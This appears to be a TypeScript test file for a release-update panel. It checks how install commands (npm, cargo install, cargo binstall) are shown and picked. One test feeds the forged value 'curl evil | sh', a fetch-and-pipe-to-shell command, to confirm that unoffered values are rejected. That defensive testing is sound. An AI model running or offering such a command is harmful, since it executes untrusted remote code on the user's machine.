// This Source Code Form is subject to the terms of the Mozilla Public
// License, v. 2.0. If a copy of the MPL was not distributed with this
// file, You can obtain one at https://mozilla.org/MPL/2.0/.
// Copyright (c) 2026 2youg1 and the sprawling contributors

// The release answer's wiring, read without its look: where the city
// cannot tell two installers apart, no command is shown until the
// person picks one, the pick is handed back to the seat, and a value
// the city did not offer never becomes a command.

import { describe, expect, test } from "bun:test";

import type { ReleaseAnswer } from "../../wire";
import { lookOf } from "./answer";

const MINE = { version: "0.0.8", released: "2026-09-20" };
const NEWEST = { version: "0.0.9", released: "2026-10-02" };
const INSTALL = "cargo install sprawling --locked";
const BINSTALL = "cargo binstall sprawling --locked";
const CARGO = [INSTALL, BINSTALL];

const behind = (alternatives: readonly string[], command?: string): ReleaseAnswer => ({
  stands: {
    mine: MINE,
    newest: NEWEST,
    registries: [{ registry: "crates_io", reading: { read: { newest: NEWEST } } }],
    update: { alternatives: [...alternatives], channel: alternatives.length > 0 ? "cargo_or_binstall" : "npm", ...(command === undefined ? {} : { command }) },
    verdict: "behind",
  },
});

function picks(): { readonly picked: (string | null)[]; readonly choose: (command: string | null) => void } {
  const picked: (string | null)[] = [];
  return { picked, choose: (command) => picked.push(command) };
}

describe("the update command", () => {
  test("a channel the city knows shows its command and offers no choice", () => {
    const look = lookOf(behind([], "npm install -g sprawling@latest"), "en", null, picks());
    expect([look.update?.choice, look.update?.command]).toEqual([undefined, "npm install -g sprawling@latest"]);
  });

  test("two possible installers show no command until one is picked", () => {
    const hands = picks();
    const unpicked = lookOf(behind(CARGO), "en", null, hands);
    expect([unpicked.update?.command, unpicked.update?.choice?.wire.value, unpicked.update?.choice?.commands]).toEqual([undefined, "", CARGO]);
    unpicked.update?.choice?.wire.onchange({ currentTarget: { value: BINSTALL } });
    expect(hands.picked).toEqual([BINSTALL]);
    const picked = lookOf(behind(CARGO), "en", BINSTALL, hands);
    expect([picked.update?.command, picked.update?.choice?.wire.value]).toEqual([BINSTALL, BINSTALL]);
  });

  test("a value the city did not offer is handed back as no pick", () => {
    const hands = picks();
    lookOf(behind(CARGO), "en", null, hands).update?.choice?.wire.onchange({ currentTarget: { value: "curl evil | sh" } });
    expect(hands.picked).toEqual([null]);
    expect(lookOf(behind(CARGO), "en", "curl evil | sh", hands).update?.command).toBeUndefined();
  });
});

describe("where this binary stands", () => {
  test("behind says both versions in the alert ink, and each registry has its line", () => {
    const look = lookOf(behind([], "npm install -g sprawling@latest"), "en", null, picks());
    expect(look.statements).toEqual([
      { ink: "text", text: "this city runs 0.0.8, cut 2026-09-20" },
      { ink: "alert", text: "a newer release is published: 0.0.9, cut 2026-10-02." },
    ]);
    expect(look.registries).toEqual([{ name: "crates.io", newest: NEWEST, reason: undefined }]);
  });

  test("a refusal draws only the refusal and what to do", () => {
    const refused: ReleaseAnswer = {
      refused: { refusal: { action: "read", code: "E_MODEL_UNCHOSEN", nearby: [], recovery: "check the network", retry: "no", subject: "npm" } },
    };
    const look = lookOf(refused, "en", null, picks());
    expect([look.refused?.recovery, look.statements, look.registries, look.update]).toEqual(["check the network", [], [], undefined]);
  });
});
